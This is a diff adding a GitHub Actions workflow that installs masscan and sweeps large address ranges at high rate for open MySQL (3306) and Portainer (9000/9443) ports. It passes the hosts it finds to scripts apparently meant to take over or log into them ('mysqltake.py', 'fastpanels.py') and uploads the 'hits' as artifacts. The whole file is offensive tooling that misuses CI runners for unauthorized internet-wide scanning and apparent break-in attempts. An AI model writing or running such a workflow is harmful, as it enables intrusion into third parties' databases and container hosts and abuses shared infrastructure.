@@ -1,0 +1,52 @@
+name: fullmisc
+on: workflow_dispatch
+jobs:
+  mysql:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan
+      - run: |
+          RANGES=$(cat r4_${{ matrix.shard }}.txt)
+          echo "shard ${{ matrix.shard }}: $(echo $RANGES | wc -w) /8 blocks"
+          sudo masscan $RANGES -p3306 --rate 100000 -oL m.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' m.txt | sort -u > my_hosts.txt
+          echo "mysql hosts: $(wc -l < my_hosts.txt)"
+          python3 mysqltake.py my_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: mysql-${{ matrix.shard }}
+          path: |
+            /tmp/mysql_hits.json
+            my_hosts.txt
+          if-no-files-found: warn
+  portainer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - run: |
+          RANGES=$(cat r4_${{ matrix.shard }}.txt)
+          sudo masscan $RANGES -p9000,9443 --rate 100000 -oL p.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' p.txt | sort -u > pt_hosts.txt
+          echo "portainer hosts: $(wc -l < pt_hosts.txt)"
+          python3 fastpanels.py pt_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: pt-${{ matrix.shard }}
+          path: |
+            /tmp/fastpanels.json
+            pt_hosts.txt
+          if-no-files-found: warn
